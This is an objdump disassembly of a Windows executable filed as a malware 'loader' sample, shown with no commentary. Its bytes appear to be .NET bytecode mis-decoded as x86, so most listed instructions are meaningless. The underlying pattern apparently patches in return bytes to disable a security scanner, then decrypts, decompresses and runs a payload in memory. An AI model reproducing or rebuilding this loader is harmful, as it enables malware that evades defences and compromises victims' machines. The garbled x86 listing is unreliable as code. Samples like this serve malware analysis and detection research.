
malware_samples/loader/67a85b53d785054676f0db7f79fea437f7a87e1eeb4938c6efed2fc55a061359.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	e0 7a                	loopne 0x40207c
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 74 65 00    	add    %al,0x657400
  402013:	00 38                	add    %bh,(%eax)
  402015:	15 00 00 01 00       	adc    $0x10000,%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	04 00                	add    $0x0,%al
  40201e:	00 06                	add    %al,(%esi)
  402020:	60                   	pusha
  402021:	26 00 00             	add    %al,%es:(%eax)
  402024:	14 3f                	adc    $0x3f,%al
	...
  40204e:	00 00                	add    %al,(%eax)
  402050:	1e                   	push   %ds
  402051:	02 28                	add    (%eax),%ch
  402053:	06                   	push   %es
  402054:	00 00                	add    %al,(%eax)
  402056:	0a 2a                	or     (%edx),%ch
  402058:	b2 02                	mov    $0x2,%dl
  40205a:	7b 02                	jnp    0x40205e
  40205c:	00 00                	add    %al,(%eax)
  40205e:	04 28                	add    $0x28,%al
  402060:	07                   	pop    %es
  402061:	00 00                	add    %al,(%eax)
  402063:	0a 6f 08             	or     0x8(%edi),%ch
  402066:	00 00                	add    %al,(%eax)
  402068:	0a 02                	or     (%edx),%al
  40206a:	7b 02                	jnp    0x40206e
  40206c:	00 00                	add    %al,(%eax)
  40206e:	04 20                	add    $0x20,%al
  402070:	80 00 00             	addb   $0x0,(%eax)
  402073:	00 28                	add    %ch,(%eax)
  402075:	09 00                	or     %eax,(%eax)
  402077:	00 0a                	add    %cl,(%edx)
  402079:	02 7b 02             	add    0x2(%ebx),%bh
  40207c:	00 00                	add    %al,(%eax)
  40207e:	04 28                	add    $0x28,%al
  402080:	0a 00                	or     (%eax),%al
  402082:	00 0a                	add    %cl,(%edx)
  402084:	2a 00                	sub    (%eax),%al
  402086:	00 00                	add    %al,(%eax)
  402088:	1b 30                	sbb    (%eax),%esi
  40208a:	05 00 2c 02 00       	add    $0x22c00,%eax
  40208f:	00 01                	add    %al,(%ecx)
  402091:	00 00                	add    %al,(%eax)
  402093:	11 28                	adc    %ebp,(%eax)
  402095:	0b 00                	or     (%eax),%eax
  402097:	00 0a                	add    %cl,(%edx)
  402099:	28 05 00 00 06 0a    	sub    %al,0xa060000
  40209f:	06                   	push   %es
  4020a0:	2d 0a 28 0b 00       	sub    $0xb280a,%eax
  4020a5:	00 0a                	add    %cl,(%edx)
  4020a7:	28 06                	sub    %al,(%esi)
  4020a9:	00 00                	add    %al,(%eax)
  4020ab:	06                   	push   %es
  4020ac:	de 23                	fisubs (%ebx)
  4020ae:	0b 72 01             	or     0x1(%edx),%esi
  4020b1:	00 00                	add    %al,(%eax)
  4020b3:	70 07                	jo     0x4020bc
  4020b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4020b6:	0c 00                	or     $0x0,%al
  4020b8:	00 0a                	add    %cl,(%edx)
  4020ba:	28 0d 00 00 0a 28    	sub    %cl,0x280a0000
  4020c0:	0e                   	push   %cs
  4020c1:	00 00                	add    %al,(%eax)
  4020c3:	0a 26                	or     (%esi),%ah
  4020c5:	28 0f                	sub    %cl,(%edi)
  4020c7:	00 00                	add    %al,(%eax)
  4020c9:	0a 6f 10             	or     0x10(%edi),%ch
  4020cc:	00 00                	add    %al,(%eax)
  4020ce:	0a de                	or     %dh,%bl
  4020d0:	00 72 25             	add    %dh,0x25(%edx)
  4020d3:	00 00                	add    %al,(%eax)
  4020d5:	70 28                	jo     0x4020ff
  4020d7:	01 00                	add    %eax,(%eax)
  4020d9:	00 06                	add    %al,(%esi)
  4020db:	0c 08                	or     $0x8,%al
  4020dd:	72 39                	jb     0x402118
  4020df:	00 00                	add    %al,(%eax)
  4020e1:	70 28                	jo     0x40210b
  4020e3:	02 00                	add    (%eax),%al
  4020e5:	00 06                	add    %al,(%esi)
  4020e7:	0d 28 11 00 00       	or     $0x1128,%eax
  4020ec:	0a 1e                	or     (%esi),%bl
  4020ee:	2e 1b 19             	sbb    %cs:(%ecx),%ebx
  4020f1:	8d 10                	lea    (%eax),%edx
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	01 13                	add    %edx,(%ebx)
  4020f7:	0d 11 0d 16 20       	or     $0x20160d11,%eax
  4020fc:	c2 00 00             	ret    $0x0
  4020ff:	00 9c 11 0d 17 1f 14 	add    %bl,0x141f170d(%ecx,%edx,1)
  402106:	9c                   	pushf
  402107:	11 0d 2b 13 17 8d    	adc    %ecx,0x8d17132b
  40210d:	10 00                	adc    %al,(%eax)
  40210f:	00 01                	add    %al,(%ecx)
  402111:	13 0e                	adc    (%esi),%ecx
  402113:	11 0e                	adc    %ecx,(%esi)
  402115:	16                   	push   %ss
  402116:	20 c3                	and    %al,%bl
  402118:	00 00                	add    %al,(%eax)
  40211a:	00 9c 11 0e 13 04 09 	add    %bl,0x904130e(%ecx,%edx,1)
  402121:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  402124:	69 6a 28 12 00 00 0a 	imul   $0xa000012,0x28(%edx),%ebp
  40212b:	7e 01                	jle    0x40212e
  40212d:	00 00                	add    %al,(%eax)
  40212f:	04 12                	add    $0x12,%al
  402131:	05 28 03 00 00       	add    $0x328,%eax
  402136:	06                   	push   %es
  402137:	26 11 04 16          	adc    %eax,%es:(%esi,%edx,1)
  40213b:	09 11                	or     %edx,(%ecx)
  40213d:	04 8e                	add    $0x8e,%al
  40213f:	69 28 13 00 00 0a    	imul   $0xa000013,(%eax),%ebp
  402145:	09 11                	or     %edx,(%ecx)
  402147:	04 8e                	add    $0x8e,%al
  402149:	69 6a 28 12 00 00 0a 	imul   $0xa000012,0x28(%edx),%ebp
  402150:	11 05 12 05 28 03    	adc    %eax,0x3280512
  402156:	00 00                	add    %al,(%eax)
  402158:	06                   	push   %es
  402159:	26 72 55             	es jb  0x4021b1
  40215c:	00 00                	add    %al,(%eax)
  40215e:	70 13                	jo     0x402173
  402160:	06                   	push   %es
  402161:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402164:	00 0a                	add    %cl,(%edx)
  402166:	13 07                	adc    (%edi),%eax
  402168:	11 07                	adc    %eax,(%edi)
  40216a:	6f                   	outsl  %ds:(%esi),(%dx)
  40216b:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  402170:	0f 16 13             	movhps (%ebx),%xmm2
  402173:	10 38                	adc    %bh,(%eax)
  402175:	a9 00 00 00 14       	test   $0x14000000,%eax
  40217a:	13 08                	adc    (%eax),%ecx
  40217c:	73 0e                	jae    0x40218c
  40217e:	00 00                	add    %al,(%eax)
  402180:	06                   	push   %es
  402181:	13 09                	adc    (%ecx),%ecx
  402183:	11 09                	adc    %ecx,(%ecx)
  402185:	11 0f                	adc    %ecx,(%edi)
  402187:	11 10                	adc    %edx,(%eax)
  402189:	9a 7d 02 00 00 04 11 	lcall  $0x1104,$0x27d
  402190:	09 7b 02             	or     %edi,0x2(%ebx)
  402193:	00 00                	add    %al,(%eax)
  402195:	04 11                	add    $0x11,%al
  402197:	06                   	push   %es
  402198:	28 16                	sub    %dl,(%esi)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	0a 2d 7d 11 09 7b    	or     0x7b09117d,%ch
  4021a2:	02 00                	add    (%eax),%al
  4021a4:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021a7:	17                   	pop    %ss
  4021a8:	00 00                	add    %al,(%eax)
  4021aa:	0a 2d 6f 11 09 7b    	or     0x7b09116f,%ch
  4021b0:	02 00                	add    (%eax),%al
  4021b2:	00 04 72             	add    %al,(%edx,%esi,2)
  4021b5:	97                   	xchg   %eax,%edi
  4021b6:	00 00                	add    %al,(%eax)
  4021b8:	70 6f                	jo     0x402229
  4021ba:	18 00                	sbb    %al,(%eax)
  4021bc:	00 0a                	add    %cl,(%edx)
  4021be:	2d 13 11 09 7b       	sub    $0x7b091113,%eax
  4021c3:	02 00                	add    (%eax),%al
  4021c5:	00 04 72             	add    %al,(%edx,%esi,2)
  4021c8:	a1 00 00 70 6f       	mov    0x6f700000,%eax
  4021cd:	18 00                	sbb    %al,(%eax)
  4021cf:	00 0a                	add    %cl,(%edx)
  4021d1:	2c 49                	sub    $0x49,%al
  4021d3:	11 09                	adc    %ecx,(%ecx)
  4021d5:	7b 02                	jnp    0x4021d9
  4021d7:	00 00                	add    %al,(%eax)
  4021d9:	04 11                	add    $0x11,%al
  4021db:	09 7b 02             	or     %edi,0x2(%ebx)
  4021de:	00 00                	add    %al,(%eax)
  4021e0:	04 28                	add    $0x28,%al
  4021e2:	0b 00                	or     (%eax),%eax
  4021e4:	00 06                	add    %al,(%esi)
  4021e6:	28 19                	sub    %bl,(%ecx)
  4021e8:	00 00                	add    %al,(%eax)
  4021ea:	0a 11                	or     (%ecx),%dl
  4021ec:	09 7b 02             	or     %edi,0x2(%ebx)
  4021ef:	00 00                	add    %al,(%eax)
  4021f1:	04 1c                	add    $0x1c,%al
  4021f3:	28 09                	sub    %cl,(%ecx)
  4021f5:	00 00                	add    %al,(%eax)
  4021f7:	0a 11                	or     (%ecx),%dl
  4021f9:	08 2d 0f 11 09 fe    	or     %ch,0xfe09110f
  4021ff:	06                   	push   %es
  402200:	0f 00 00             	sldt   (%eax)
  402203:	06                   	push   %es
  402204:	73 1a                	jae    0x402220
  402206:	00 00                	add    %al,(%eax)
  402208:	0a 13                	or     (%ebx),%dl
  40220a:	08 11                	or     %dl,(%ecx)
  40220c:	08 73 1b             	or     %dh,0x1b(%ebx)
  40220f:	00 00                	add    %al,(%eax)
  402211:	0a 28                	or     (%eax),%ch
  402213:	1c 00                	sbb    $0x0,%al
  402215:	00 0a                	add    %cl,(%edx)
  402217:	de 03                	fiadds (%ebx)
  402219:	26 de 00             	fiadds %es:(%eax)
  40221c:	11 10                	adc    %edx,(%eax)
  40221e:	17                   	pop    %ss
  40221f:	58                   	pop    %eax
  402220:	13 10                	adc    (%eax),%edx
  402222:	11 10                	adc    %edx,(%eax)
  402224:	11 0f                	adc    %ecx,(%edi)
  402226:	8e 69 3f             	mov    0x3f(%ecx),%gs
  402229:	4c                   	dec    %esp
  40222a:	ff                   	(bad)
  40222b:	ff                   	(bad)
  40222c:	ff 11                	call   *(%ecx)
  40222e:	06                   	push   %es
  40222f:	28 0b                	sub    %cl,(%ebx)
  402231:	00 00                	add    %al,(%eax)
  402233:	06                   	push   %es
  402234:	72 ab                	jb     0x4021e1
  402236:	00 00                	add    %al,(%eax)
  402238:	70 28                	jo     0x402262
  40223a:	1d 00 00 0a 72       	sbb    $0x720a0000,%eax
  40223f:	05 01 00 70 28       	add    $0x28700001,%eax
  402244:	1d 00 00 0a 28       	sbb    $0x280a0000,%eax
  402249:	09 00                	or     %eax,(%eax)
  40224b:	00 06                	add    %al,(%esi)
  40224d:	28 0a                	sub    %cl,(%edx)
  40224f:	00 00                	add    %al,(%eax)
  402251:	06                   	push   %es
  402252:	13 0a                	adc    (%edx),%ecx
  402254:	16                   	push   %ss
  402255:	8d 0c 00             	lea    (%eax,%eax,1),%ecx
  402258:	00 01                	add    %al,(%ecx)
  40225a:	13 0b                	adc    (%ebx),%ecx
  40225c:	02 8e 69 16 30 08    	add    0x8301669(%esi),%cl
  402262:	16                   	push   %ss
  402263:	8d 0c 00             	lea    (%eax,%eax,1),%ecx
  402266:	00 01                	add    %al,(%ecx)
  402268:	2b 18                	sub    (%eax),%ebx
  40226a:	02 16                	add    (%esi),%dl
  40226c:	9a 17 8d 17 00 00 01 	lcall  $0x100,$0x178d17
  402273:	13 11                	adc    (%ecx),%edx
  402275:	11 11                	adc    %edx,(%ecx)
  402277:	16                   	push   %ss
  402278:	1f                   	pop    %ds
  402279:	20 9d 11 11 6f 1e    	and    %bl,0x1e6f1111(%ebp)
  40227f:	00 00                	add    %al,(%eax)
  402281:	0a 13                	or     (%ebx),%dl
  402283:	0b de                	or     %esi,%ebx
  402285:	03 26                	add    (%esi),%esp
  402287:	de 00                	fiadds (%eax)
  402289:	11 0a                	adc    %ecx,(%edx)
  40228b:	28 1f                	sub    %bl,(%edi)
  40228d:	00 00                	add    %al,(%eax)
  40228f:	0a 6f 20             	or     0x20(%edi),%ch
  402292:	00 00                	add    %al,(%eax)
  402294:	0a 13                	or     (%ebx),%dl
  402296:	0c 11                	or     $0x11,%al
  402298:	0c 14                	or     $0x14,%al
  40229a:	17                   	pop    %ss
  40229b:	8d 01                	lea    (%ecx),%eax
  40229d:	00 00                	add    %al,(%eax)
  40229f:	01 13                	add    %edx,(%ebx)
  4022a1:	12 11                	adc    (%ecx),%dl
  4022a3:	12 16                	adc    (%esi),%dl
  4022a5:	11 0b                	adc    %ecx,(%ebx)
  4022a7:	a2 11 12 6f 21       	mov    %al,0x216f1211
  4022ac:	00 00                	add    %al,(%eax)
  4022ae:	0a 26                	or     (%esi),%ah
  4022b0:	de 0d 26 11 0c 14    	fimuls 0x140c1126
  4022b6:	14 6f                	adc    $0x6f,%al
  4022b8:	21 00                	and    %eax,(%eax)
  4022ba:	00 0a                	add    %cl,(%edx)
  4022bc:	26 de 00             	fiadds %es:(%eax)
  4022bf:	2a 01                	sub    (%ecx),%al
  4022c1:	34 00                	xor    $0x0,%al
  4022c3:	00 00                	add    %al,(%eax)
  4022c5:	00 00                	add    %al,(%eax)
  4022c7:	00 1a                	add    %bl,(%edx)
  4022c9:	1a 00                	sbb    (%eax),%al
  4022cb:	23 1a                	and    (%edx),%ebx
  4022cd:	00 00                	add    %al,(%eax)
  4022cf:	01 00                	add    %eax,(%eax)
  4022d1:	00 3f                	add    %bh,(%edi)
  4022d3:	01 46 85             	add    %eax,-0x7b(%esi)
  4022d6:	01 03                	add    %eax,(%ebx)
  4022d8:	01 00                	add    %eax,(%eax)
  4022da:	00 01                	add    %al,(%ecx)
  4022dc:	00 00                	add    %al,(%eax)
  4022de:	c8 01 2a f2          	enter  $0x2a01,$0xf2
  4022e2:	01 03                	add    %eax,(%ebx)
  4022e4:	01 00                	add    %eax,(%eax)
  4022e6:	00 01                	add    %al,(%ecx)
  4022e8:	00 00                	add    %al,(%eax)
  4022ea:	03 02                	add    (%edx),%eax
  4022ec:	1b 1e                	sbb    (%esi),%ebx
  4022ee:	02 0d 01 00 00 01    	add    0x1000001,%cl
  4022f4:	3a 02                	cmp    (%edx),%al
  4022f6:	1f                   	pop    %ds
  4022f7:	1a 28                	sbb    (%eax),%ch
  4022f9:	22 00                	and    (%eax),%al
  4022fb:	00 0a                	add    %cl,(%edx)
  4022fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4022fe:	23 00                	and    (%eax),%eax
  402300:	00 0a                	add    %cl,(%edx)
  402302:	2a 00                	sub    (%eax),%al
  402304:	1b 30                	sbb    (%eax),%esi
  402306:	04 00                	add    $0x0,%al
  402308:	e4 00                	in     $0x0,%al
  40230a:	00 00                	add    %al,(%eax)
  40230c:	02 00                	add    (%eax),%al
  40230e:	00 11                	add    %dl,(%ecx)
  402310:	1d 28 22 00 00       	sbb    $0x2228,%eax
  402315:	0a 0a                	or     (%edx),%cl
  402317:	06                   	push   %es
  402318:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40231b:	00 0a                	add    %cl,(%edx)
  40231d:	2d 07 06 28 25       	sub    $0x25280607,%eax
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 26                	or     (%esi),%ah
  402326:	72 37                	jb     0x40235f
  402328:	01 00                	add    %eax,(%eax)
  40232a:	70 28                	jo     0x402354
  40232c:	26 00 00             	add    %al,%es:(%eax)
  40232f:	0a 13                	or     (%ebx),%dl
  402331:	04 12                	add    $0x12,%al
  402333:	04 fe                	add    $0xfe,%al
  402335:	16                   	push   %ss
  402336:	1f                   	pop    %ds
  402337:	00 00                	add    %al,(%eax)
  402339:	01 6f 0c             	add    %ebp,0xc(%edi)
  40233c:	00 00                	add    %al,(%eax)
  40233e:	0a 16                	or     (%esi),%dl
  402340:	1e                   	push   %ds
  402341:	6f                   	outsl  %ds:(%esi),(%dx)
  402342:	27                   	daa
  402343:	00 00                	add    %al,(%eax)
  402345:	0a 28                	or     (%eax),%ch
  402347:	28 00                	sub    %al,(%eax)
  402349:	00 0a                	add    %cl,(%edx)
  40234b:	0b 06                	or     (%esi),%eax
  40234d:	07                   	pop    %es
  40234e:	28 29                	sub    %ch,(%ecx)
  402350:	00 00                	add    %al,(%eax)
  402352:	0a 0c 02             	or     (%edx,%eax,1),%cl
  402355:	28 2a                	sub    %ch,(%edx)
  402357:	00 00                	add    %al,(%eax)
  402359:	0a 08                	or     (%eax),%cl
  40235b:	28 2a                	sub    %ch,(%edx)
  40235d:	00 00                	add    %al,(%eax)
  40235f:	0a 1b                	or     (%ebx),%bl
  402361:	28 2b                	sub    %ch,(%ebx)
  402363:	00 00                	add    %al,(%eax)
  402365:	0a 2c 05 dd 86 00 00 	or     0x86dd(,%eax,1),%ch
  40236c:	00 02                	add    %al,(%edx)
  40236e:	08 17                	or     %dl,(%edi)
  402370:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402373:	00 0a                	add    %cl,(%edx)
  402375:	1f                   	pop    %ds
  402376:	0a 28                	or     (%eax),%ch
  402378:	2d 00 00 0a 72       	sub    $0x720a0000,%eax
  40237d:	63 01                	arpl   %eax,(%ecx)
  40237f:	00 70 28             	add    %dh,0x28(%eax)
  402382:	2e 00 00             	add    %al,%cs:(%eax)
  402385:	0a 72 9f             	or     -0x61(%edx),%dh
  402388:	01 00                	add    %eax,(%eax)
  40238a:	70 28                	jo     0x4023b4
  40238c:	2e 00 00             	add    %al,%cs:(%eax)
  40238f:	0a 72 f1             	or     -0xf(%edx),%dh
  402392:	01 00                	add    %eax,(%eax)
  402394:	70 08                	jo     0x40239e
  402396:	28 0d 00 00 0a 28    	sub    %cl,0x280a0000
  40239c:	2e 00 00             	add    %al,%cs:(%eax)
  40239f:	0a 72 0b             	or     0xb(%edx),%dh
  4023a2:	02 00                	add    (%eax),%al
  4023a4:	70 28                	jo     0x4023ce
  4023a6:	2e 00 00             	add    %al,%cs:(%eax)
  4023a9:	0a 28                	or     (%eax),%ch
  4023ab:	2f                   	das
  4023ac:	00 00                	add    %al,(%eax)
  4023ae:	0a de                	or     %dh,%bl
  4023b0:	42                   	inc    %edx
  4023b1:	0d 1f 0c 28 2d       	or     $0x2d280c1f,%eax
  4023b6:	00 00                	add    %al,(%eax)
  4023b8:	0a 72 63             	or     0x63(%edx),%dh
  4023bb:	01 00                	add    %eax,(%eax)
  4023bd:	70 28                	jo     0x4023e7
  4023bf:	2e 00 00             	add    %al,%cs:(%eax)
  4023c2:	0a 72 47             	or     0x47(%edx),%dh
  4023c5:	02 00                	add    (%eax),%al
  4023c7:	70 28                	jo     0x4023f1
  4023c9:	2e 00 00             	add    %al,%cs:(%eax)
  4023cc:	0a 72 8d             	or     -0x73(%edx),%dh
  4023cf:	02 00                	add    (%eax),%al
  4023d1:	70 09                	jo     0x4023dc
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	30 00                	xor    %al,(%eax)
  4023d6:	00 0a                	add    %cl,(%edx)
  4023d8:	28 0d 00 00 0a 28    	sub    %cl,0x280a0000
  4023de:	2e 00 00             	add    %al,%cs:(%eax)
  4023e1:	0a 72 0b             	or     0xb(%edx),%dh
  4023e4:	02 00                	add    (%eax),%al
  4023e6:	70 28                	jo     0x402410
  4023e8:	2e 00 00             	add    %al,%cs:(%eax)
  4023eb:	0a 28                	or     (%eax),%ch
  4023ed:	2f                   	das
  4023ee:	00 00                	add    %al,(%eax)
  4023f0:	0a de                	or     %dh,%bl
  4023f2:	00 2a                	add    %ch,(%edx)
  4023f4:	01 10                	add    %edx,(%eax)
  4023f6:	00 00                	add    %al,(%eax)
  4023f8:	00 00                	add    %al,(%eax)
  4023fa:	00 00                	add    %al,(%eax)
  4023fc:	a1 a1 00 42 1a       	mov    0x1a4200a1,%eax
  402401:	00 00                	add    %al,(%eax)
  402403:	01 13                	add    %edx,(%ebx)
  402405:	30 02                	xor    %al,(%edx)
  402407:	00 19                	add    %bl,(%ecx)
  402409:	00 00                	add    %al,(%eax)
  40240b:	00 03                	add    %al,(%ebx)
  40240d:	00 00                	add    %al,(%eax)
  40240f:	11 28                	adc    %ebp,(%eax)
  402411:	31 00                	xor    %eax,(%eax)
  402413:	00 0a                	add    %cl,(%edx)
  402415:	0a 06                	or     (%esi),%al
  402417:	73 32                	jae    0x40244b
  402419:	00 00                	add    %al,(%eax)
  40241b:	0a 0b                	or     (%ebx),%cl
  40241d:	07                   	pop    %es
  40241e:	20 20                	and    %ah,(%eax)
  402420:	02 00                	add    (%eax),%al
  402422:	00 6f 33             	add    %ch,0x33(%edi)
  402425:	00 00                	add    %al,(%eax)
  402427:	0a 2a                	or     (%edx),%ch
  402429:	00 00                	add    %al,(%eax)
  40242b:	00 1b                	add    %bl,(%ebx)
  40242d:	30 03                	xor    %al,(%ebx)
  40242f:	00 b6 00 00 00 04    	add    %dh,0x4000000(%esi)
  402435:	00 00                	add    %al,(%eax)
  402437:	11 02                	adc    %eax,(%edx)
  402439:	72 93                	jb     0x4023ce
  40243b:	02 00                	add    (%eax),%al
  40243d:	70 72                	jo     0x4024b1
  40243f:	97                   	xchg   %eax,%edi
  402440:	02 00                	add    (%eax),%al
  402442:	70 6f                	jo     0x4024b3
  402444:	34 00                	xor    $0x0,%al
  402446:	00 0a                	add    %cl,(%edx)
  402448:	0a 72 9d             	or     -0x63(%edx),%dh
  40244b:	02 00                	add    (%eax),%al
  40244d:	70 06                	jo     0x402455
  40244f:	72 34                	jb     0x402485
  402451:	03 00                	add    (%eax),%eax
  402453:	70 28                	jo     0x40247d
  402455:	35 00 00 0a 0b       	xor    $0xb0a0000,%eax
  40245a:	07                   	pop    %es
  40245b:	73 36                	jae    0x402493
  40245d:	00 00                	add    %al,(%eax)
  40245f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402462:	6f                   	outsl  %ds:(%esi),(%dx)
  402463:	37                   	aaa
  402464:	00 00                	add    %al,(%eax)
  402466:	0a 6f 38             	or     0x38(%edi),%ch
  402469:	00 00                	add    %al,(%eax)
  40246b:	0a 13                	or     (%ebx),%dl
  40246d:	07                   	pop    %es
  40246e:	2b 4a 11             	sub    0x11(%edx),%ecx
  402471:	07                   	pop    %es
  402472:	6f                   	outsl  %ds:(%esi),(%dx)
  402473:	39 00                	cmp    %eax,(%eax)
  402475:	00 0a                	add    %cl,(%edx)
  402477:	74 2a                	je     0x4024a3
  402479:	00 00                	add    %al,(%eax)
  40247b:	01 0d 09 72 3a 03    	add    %ecx,0x33a7209
  402481:	00 70 6f             	add    %dh,0x6f(%eax)
  402484:	3a 00                	cmp    (%eax),%al
  402486:	00 0a                	add    %cl,(%edx)
  402488:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402489:	2b 00                	sub    (%eax),%eax
  40248b:	00 01                	add    %al,(%ecx)
  40248d:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402490:	04 28                	add    $0x28,%al
  402492:	3b 00                	cmp    (%eax),%eax
  402494:	00 0a                	add    %cl,(%edx)
  402496:	13 05 11 05 6f 10    	adc    0x106f0511,%eax
  40249c:	00 00                	add    %al,(%eax)
  40249e:	0a 72 4e             	or     0x4e(%edx),%dh
  4024a1:	03 00                	add    (%eax),%eax
  4024a3:	70 11                	jo     0x4024b6
  4024a5:	04 8c                	add    $0x8c,%al
  4024a7:	2b 00                	sub    (%eax),%eax
  4024a9:	00 01                	add    %al,(%ecx)
  4024ab:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  4024ae:	00 0a                	add    %cl,(%edx)
  4024b0:	28 2e                	sub    %ch,(%esi)
  4024b2:	00 00                	add    %al,(%eax)
  4024b4:	0a de                	or     %dh,%bl
  4024b6:	03 26                	add    (%esi),%esp
  4024b8:	de 00                	fiadds (%eax)
  4024ba:	11 07                	adc    %eax,(%edi)
  4024bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4024bd:	3d 00 00 0a 2d       	cmp    $0x2d0a0000,%eax
  4024c2:	ad                   	lods   %ds:(%esi),%eax
  4024c3:	de 0c 11             	fimuls (%ecx,%edx,1)
  4024c6:	07                   	pop    %es
  4024c7:	2c 07                	sub    $0x7,%al
  4024c9:	11 07                	adc    %eax,(%edi)
  4024cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4024cc:	3e 00 00             	add    %al,%ds:(%eax)
  4024cf:	0a dc                	or     %ah,%bl
  4024d1:	de 1a                	ficomps (%edx)
  4024d3:	13 06                	adc    (%esi),%eax
  4024d5:	72 a0                	jb     0x402477
  4024d7:	03 00                	add    (%eax),%eax
  4024d9:	70 11                	jo     0x4024ec
  4024db:	06                   	push   %es
  4024dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4024dd:	30 00                	xor    %al,(%eax)
  4024df:	00 0a                	add    %cl,(%edx)
  4024e1:	28 0d 00 00 0a 28    	sub    %cl,0x280a0000
  4024e7:	2e 00 00             	add    %al,%cs:(%eax)
  4024ea:	0a de                	or     %dh,%bl
  4024ec:	00 2a                	add    %ch,(%edx)
  4024ee:	00 00                	add    %al,(%eax)
  4024f0:	01 28                	add    %ebp,(%eax)
  4024f2:	00 00                	add    %al,(%eax)
  4024f4:	00 00                	add    %al,(%eax)
  4024f6:	57                   	push   %edi
  4024f7:	00 28                	add    %ch,(%eax)
  4024f9:	7f 00                	jg     0x4024fb
  4024fb:	03 01                	add    (%ecx),%eax
  4024fd:	00 00                	add    %al,(%eax)
  4024ff:	01 02                	add    %eax,(%edx)
  402501:	00 36                	add    %dh,(%esi)
  402503:	00 57 8d             	add    %dl,-0x73(%edi)
  402506:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402509:	00 00                	add    %al,(%eax)
  40250b:	00 00                	add    %al,(%eax)
  40250d:	00 00                	add    %al,(%eax)
  40250f:	00 9b 9b 00 1a 1a    	add    %bl,0x1a1a009b(%ebx)
  402515:	00 00                	add    %al,(%eax)
  402517:	01 1b                	add    %ebx,(%ebx)
  402519:	30 04 00             	xor    %al,(%eax,%eax,1)
  40251c:	37                   	aaa
  40251d:	00 00                	add    %al,(%eax)
  40251f:	00 05 00 00 11 73    	add    %al,0x73110000
  402525:	3f                   	aas
  402526:	00 00                	add    %al,(%eax)
  402528:	0a 0a                	or     (%edx),%cl
  40252a:	06                   	push   %es
  40252b:	17                   	pop    %ss
  40252c:	6f                   	outsl  %ds:(%esi),(%dx)
  40252d:	40                   	inc    %eax
  40252e:	00 00                	add    %al,(%eax)
  402530:	0a 06                	or     (%esi),%al
  402532:	18 6f 41             	sbb    %ch,0x41(%edi)
  402535:	00 00                	add    %al,(%eax)
  402537:	0a 06                	or     (%esi),%al
  402539:	03 04 6f             	add    (%edi,%ebp,2),%eax
  40253c:	42                   	inc    %edx
  40253d:	00 00                	add    %al,(%eax)
  40253f:	0a 0b                	or     (%ebx),%cl
  402541:	07                   	pop    %es
  402542:	02 16                	add    (%esi),%dl
  402544:	02 8e 69 6f 43 00    	add    0x436f69(%esi),%cl
  40254a:	00 0a                	add    %cl,(%edx)
  40254c:	0c de                	or     $0xde,%al
  40254e:	0a 06                	or     (%esi),%al
  402550:	2c 06                	sub    $0x6,%al
  402552:	06                   	push   %es
  402553:	6f                   	outsl  %ds:(%esi),(%dx)
  402554:	3e 00 00             	add    %al,%ds:(%eax)
  402557:	0a dc                	or     %ah,%bl
  402559:	08 2a                	or     %ch,(%edx)
  40255b:	00 01                	add    %al,(%ecx)
  40255d:	10 00                	adc    %al,(%eax)
  40255f:	00 02                	add    %al,(%edx)
  402561:	00 06                	add    %al,(%esi)
  402563:	00 25 2b 00 0a 00    	add    %ah,0xa002b
  402569:	00 00                	add    %al,(%eax)
  40256b:	00 1b                	add    %bl,(%ebx)
  40256d:	30 02                	xor    %al,(%edx)
  40256f:	00 47 00             	add    %al,0x0(%edi)
  402572:	00 00                	add    %al,(%eax)
  402574:	06                   	push   %es
  402575:	00 00                	add    %al,(%eax)
  402577:	11 02                	adc    %eax,(%edx)
  402579:	73 44                	jae    0x4025bf
  40257b:	00 00                	add    %al,(%eax)
  40257d:	0a 0a                	or     (%edx),%cl
  40257f:	73 45                	jae    0x4025c6
  402581:	00 00                	add    %al,(%eax)
  402583:	0a 0b                	or     (%ebx),%cl
  402585:	06                   	push   %es
  402586:	16                   	push   %ss
  402587:	73 46                	jae    0x4025cf
  402589:	00 00                	add    %al,(%eax)
  40258b:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  40258e:	07                   	pop    %es
  40258f:	6f                   	outsl  %ds:(%esi),(%dx)
  402590:	47                   	inc    %edi
  402591:	00 00                	add    %al,(%eax)
  402593:	0a de                	or     %dh,%bl
  402595:	0a 08                	or     (%eax),%cl
  402597:	2c 06                	sub    $0x6,%al
  402599:	08 6f 3e             	or     %ch,0x3e(%edi)
  40259c:	00 00                	add    %al,(%eax)
  40259e:	0a dc                	or     %ah,%bl
  4025a0:	07                   	pop    %es
  4025a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4025a2:	48                   	dec    %eax
  4025a3:	00 00                	add    %al,(%eax)
  4025a5:	0a 0d de 14 07 2c    	or     0x2c0714de,%cl
  4025ab:	06                   	push   %es
  4025ac:	07                   	pop    %es
  4025ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4025ae:	3e 00 00             	add    %al,%ds:(%eax)
  4025b1:	0a dc                	or     %ah,%bl
  4025b3:	06                   	push   %es
  4025b4:	2c 06                	sub    $0x6,%al
  4025b6:	06                   	push   %es
